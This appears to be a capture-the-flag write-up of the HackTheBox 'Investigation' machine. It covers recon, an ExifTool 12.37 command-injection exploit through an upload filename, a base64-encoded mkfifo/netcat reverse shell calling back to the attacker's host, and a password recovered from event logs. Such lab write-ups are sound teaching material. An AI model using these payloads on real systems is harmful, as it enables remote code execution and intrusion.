# HTB - Investigation
# Start: 28/02/2023
# IP 10.10.11.197

## Info gathering
### Nmap
```
 nmap -sV -sC investigation.htb -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 14:52 GMT
Nmap scan report for investigation.htb (10.10.11.197)
Host is up (0.013s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://eforenzics.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
6969/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
|_http-title: Directory listing for /
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Interesting:
- Redirect to eforenzics.htb
- secondary http server with directory listing

adding the redirect to host file, no change in nmap

### WebContent
#### http://eforenzics.htb/

##### /service.html
allows for a .jpg file to be uploaded and returns a link to `/analysed_images/`, a sample output is as follows
```
ExifTool Version Number         : 12.37
File Name                       : White-faced Saki Monkey image.jpg
Directory                       : .
File Size                       : 7.4 KiB
File Modification Date/Time     : 2023:02:28 18:43:27+00:00
File Access Date/Time           : 2023:02:28 18:43:27+00:00
File Inode Change Date/Time     : 2023:02:28 18:43:27+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Exif Byte Order                 : Little-endian (Intel, II)
Software                        : Google
Exif Version                    : 0220
Exif Image Width                : 275
Exif Image Height               : 183
Image Width                     : 275
Image Height                    : 183
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 275x183
Megapixels                      : 0.050
```
The tool used to generate is listed at the top, ExifTool v12.37
Interesting:
- Exiftool 12.37 is vunerable to command injection < 12.38 (https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)


Other process run:
- gobuster returned nothing interesting
#### SimpleHTTP port 6969
Interesting:
- Contains 2 files, one is empty (analyzed log)
- The other is some sort of message file, using an online .msg reader, there is one zip attachment with a windows log file (.evtx)

### Event Logs
Interesting:
- Domain:EFORENZICS-DI
- accounts: SMorton,AAnderson,Administrator,(a lot)


## Exploiting
its enough to upload one image and save it into burpsuite repeater so you can edit the filename field within the form-data,
to confirm the vulnerability was exploitable i used `filename="echo 'curl 10.10.14.58:8000' | bash |"` which did indeed call back to my host.

if we add any other pipes to the command e.g. > the command will fail to run, however we can pass a b64 encoded command, pipe it to the base64 -d command to decode and pipe the result into bash to run it, which avoids the other pipes breaking it.

```
curl 10.10.14.58:8000/?d=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.58 4444 >/tmp/f)
b64 encoded:
Y3VybCAxMC4xMC4xNC43MDo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNzAgNDQ0NCA+L3RtcC9mKQ==

filename="echo 'Y3VybCAxMC4xMC4xNC41ODo4MDAwLz9kPSQocm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNTggNDQ0NCA+L3RtcC9mKQ==' | base64 -d | bash |"

```

```
nc -lvnp 4444                                            
Listening on 0.0.0.0 4444
Connection received on 10.10.11.197 33714
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data


```

We have internal access to the box!
### Host info gathering
Running linpeas first as we are in a linux server

users with console:
```
root:x:0:0:root:/root:/bin/bash
smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
```
```
══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
```
```
╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc

```
### Event Logs (part 2)
I missed something important within the event log, i searched for the typical event ID:4624 which is successful login, but i did not check 4625, where we can find someone trying to login with the password as the username! Silly!
Password found `Def@ultf0r3nz!csPa$$`

```
$ su smorton 
Password: Def@ultf0r3nz!csPa$$
whoami
smorton

```
and we're in to a legit user!